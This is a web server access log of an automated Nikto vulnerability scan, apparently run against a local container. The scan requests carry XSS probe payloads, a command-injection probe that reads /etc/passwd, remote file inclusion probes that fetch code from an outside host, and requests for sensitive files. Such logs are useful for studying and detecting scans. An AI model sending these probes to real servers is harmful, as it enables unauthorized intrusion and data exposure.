172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php/\\\"><script><script>alert(document.cookie)</script>< HTTP/1.1" 302 479 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000878)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php/content/search/?SectionID=3&SearchText=<script>alert(document.cookie)</script> HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000879)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php/content/advancedsearch/?SearchText=<script>alert(document.cookie)</script>&PhraseSearchText=<script>alert(document.cookie)</script>&SearchContentClassID=-1&SearchSectionID=-1&SearchDate=-1&SearchButton=Search HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000880)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /include.php?path=contact.php&contact_email=\\\">&lt;script&gt;alert(document.cookie);&lt;/script&gt; HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000881)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /html/partner.php?mainfile=anything&Default_Theme='<script>alert(document.cookie);</script> HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000882)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /html/chatheader.php?mainfile=anything&Default_Theme='<script>alert(document.cookie);</script> HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000883)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /html/cgi-bin/cgicso?query=<script>alert('Vulnerable')</script> HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000884)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /guestbook/?number=5&lng=%3Cscript%3Ealert(document.domain);%3C/script%3E HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000885)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /gallery/search.php?searchstring=<script>alert(document.cookie)</script> HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000886)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /friend.php?op=SiteSent&fname=<script>alert('Vulnerable')</script> HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000887)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /forum_members.asp?find=%22;}alert(9823);function%20x(){v%20=%22 HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000888)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /forums/index.php?top_message=&lt;script&gt;alert(document.cookie)&lt;/script&gt; HTTP/1.1" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /forums/index.php?board=;action=login2&user=USERNAME&cookielength=120&passwrd=PASSWORD<script>alert('Vulnerable')</script> HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000890)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /forums/browse.php?fid=3&tid=46&go=<script>JavaScript:alert('Vulnerable');</script> HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000891)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /esp?PAGE=&lt;script&gt;alert(document.cookie)&lt;/script&gt; HTTP/1.1" 404 494 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000892)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /error/500error.jsp?et=1<script>alert('Vulnerable')</script>; HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000893)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /downloads/pafiledb.php?action=rate&id=4?\\\"&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\\\" HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000894)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /downloads/pafiledb.php?action=email&id=4?\\\"&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\\\" HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000895)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /downloads/pafiledb.php?action=download&id=4?\\\"&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\\\" HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000896)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /download.php?sortby=&dcategory=<script>alert('Vulnerable')</script> HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000897)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /default.php?info_message=%3Cscript%20language=javascript%3Ewindow.alert%28document.cookie%29;%3C/script%3E HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000898)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /default.php?error_message=%3Cscript%20language=javascript%3Ewindow.alert%28document.cookie%29;%3C/script%3E HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000899)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /comments/browse.php?fid=2&tid=4&go=&lt;script&gt;alert('Vulnerable')&lt;/script&gt; HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000900)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /comments.php?subject=<script>alert('Vulnerable')</script>&comment=<script>alert('Vulnerable')</script>&pid=0&sid=0&mode=&order=&thold=op=Preview HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000901)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cleartrust/ct_logon.asp?CTLoginErrorMsg=<script>alert(1)</script> HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000902)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cleartrust/ct_logon.asp?CTAuthMode=BASIC&CTLoginErrorMsg=xx&ct_orig_uri=\\\">< script>alert(1)/script><\\\"" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /chat/register.php?register=yes&username=OverG&email=<script>alert%20(\\\"Vulnerable\\\")</script>&email1=<script>alert%20(\\\"Vulnerable\\\")</script> HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000904)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cgi-local/cgiemail-1.6/cgicso?query=<script>alert('Vulnerable')</script> HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000905)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cgi-local/cgiemail-1.4/cgicso?query=<script>alert('Vulnerable')</script> HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000906)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cgi-bin/.cobalt/message/message.cgi?info=%3Cscript%3Ealert%28%27alert%27%29%3B%3C/script%3E HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000908)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /calendar.php?year=<script>alert(document.cookie);</script>&month=03&day=05 HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000909)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /ca000007.pl?ACTION=SHOWCART&REFPAGE=\\\"><script>alert('Vulnerable')</script> HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000910)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /ca000001.pl?ACTION=SHOWCART&hop=\\\"><script>alert('Vulnerable')</script>&PATH=acatalog%2f HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000911)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /bb000001.pl<script>alert('Vulnerable')</script> HTTP/1.1" 404 550 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000912)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /article.php?sid=\\\"><Img Src=javascript:alert('Vulnerable')><Img" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /article.cfm?id=1'<script>alert(document.cookie);</script> HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000914)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /apps/web/vs_diag.cgi?server=<script>alert('Vulnerable')</script> HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000915)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /anthill/login.php HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000916)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admin/login.php?path=\\\"></form><form name=a><input" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /addressbook/index.php?surname=<script>alert('Vulnerable')</script> HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000918)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /addressbook/index.php?name=<script>alert('Vulnerable')</script> HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000919)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /add.php3?url=ja&adurl=javascript:<script>alert('Vulnerable')</script> HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000920)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /a?<script>alert('Vulnerable')</script> HTTP/1.1" 404 492 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000921)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /a.jsp/<script>alert('Vulnerable')</script> HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000922)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /?mod=<script>alert(document.cookie)</script>&op=browse HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000923)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /<script>alert('Vulnerable')</script>.thtml HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000924)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /<script>alert('Vulnerable')</script>.shtml HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000925)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /<script>alert('Vulnerable')</script>.jsp HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000926)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /<script>alert('Vulnerable')</script>.aspx HTTP/1.1" 404 544 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000927)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET //profiles.php?what=contact&author=ich&authoremail=bla%40bla.com&subject=hello&message=text&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt; HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000928)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET //comment.php?mode=Delete&sid=1&cid=&lt;script&gt;alert(document.cookie)&lt;/script&gt; HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000929)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /&lt;script&gt;alert('Vulnerable');&lt;/script&gt; HTTP/1.1" 404 556 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000930)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html HTTP/1.1" 404 553 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000931)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e HTTP/1.1" 404 556 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000932)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e HTTP/1.1" 404 552 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000933)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /%22%3cscript%3ealert(%22xss%22)%3c/script%3e HTTP/1.1" 404 548 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000934)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /%0a%0a<script>alert(\\\"Vulnerable\\\")</script>.jsp HTTP/1.1" 404 557 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000935)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /add_user.php HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000938)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cfdocs/expeval/displayopenedfile.cfm HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000942)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cfdocs/expeval/sendmail.cfm HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000943)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cgi-bin/bigconf.cgi HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000944)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /ammerum/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000947)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /ariadne/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000948)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cbms/cbmsfoot.php HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000949)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cbms/changepass.php HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000950)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cbms/editclient.php HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000951)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cbms/passgen.php HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000952)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cbms/realinv.php HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000953)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cbms/usersetup.php HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000954)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000961)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /ext.dll?MfcIsapiCommand=LoadPage&page=admin.hts%20&a0=add&a1=root&a2=%5C HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000962)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /db/users.dat HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000963)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /?sql_debug=1 HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000984)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /a_security.htm HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000985)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /Admin_files/order.log HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000986)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admin.html HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000987)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admin/cplogfile.log HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000988)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admin/system_footer.php HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000989)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cfdocs/snippets/fileexists.cfm HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000990)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cgi-bin/MachineInfo HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000991)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /chat/!nicks.txt HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000992)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /chat/!pwds.txt HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000993)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /chat/data/usr HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000994)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /com HTTP/1.1" 404 494 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000995)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /COM HTTP/1.1" 404 494 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000996)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /config.php HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000997)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /config/ HTTP/1.1" 200 1395 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000998)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cplogfile.log HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000999)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cutenews/index.php?debug HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001000)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /examples/jsp/snp/anything.snp HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001001)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /file-that-is-not-real-2002.php3 HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001002)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?sql_debug=1 HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001003)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cfdocs/snippets/viewexample.cfm HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001006)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /chassis/config/GeneralChassisConfig.html HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001007)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /hp/device/this.LCDispatcher HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001011)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cfdocs/snippets/evaluate.cfm HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001012)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cfide/Administrator/startstop.html HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001013)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /Mem/dynaform/FileExplorer.htm HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001026)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cd-cgi/sscd_suncourier.pl HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001067)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cgi-bin/handler HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001069)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cgi-bin/handler/netsonar;cat /etc/passwd|?data=Download" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cgi-bin/webdist.cgi HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001071)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /DB4Web/10.10.10.10:100 HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001072)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /ews/ews/architext_query.pl HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001073)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /exec/show/config/cr HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001074)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /instantwebmail/message.php HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001075)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /cfdocs/snippets/gettempdirectory.cfm HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001076)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admin.php?en_log_id=0&action=config HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001082)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admin.php?en_log_id=0&action=users HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001083)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admin.php4?reg_login=1 HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001084)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admin/admin_phpinfo.php4 HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001085)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admin/login.php?action=insert&username=test&password=test HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001086)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /interscan/cgi-bin/FtpSave.dll?I'm%20Here HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001088)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /ext.ini.%00.txt HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001089)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /dostuff.php?action=modify_user HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001091)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /accounts/getuserdesc.asp HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001093)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /Admin/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001101)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /achievo/atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001109)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /agentadmin.php HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001110)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /b2-include/b2edit.showposts.php?b2inc=http://cirt.net/rfiinc.txt?&cmd=ls HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001111)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /catalog/includes/include_once.php?include_file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001112)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /errors/needinit.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001113)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /sqldump.sql HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001114)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /structure.sql HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001115)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /servlet/SessionManager HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001116)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /php.ini HTTP/1.1" 200 406 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001117)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /SiteScope/cgi/go.exe/SiteScope?page=eventLog&machine=&logName=System&account=administrator HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001118)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /ip.txt HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001119)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /J5BtjS.cfm?mode=debug HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001120)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/42/exec/show%20conf HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001121)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /livehelp/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001122)"
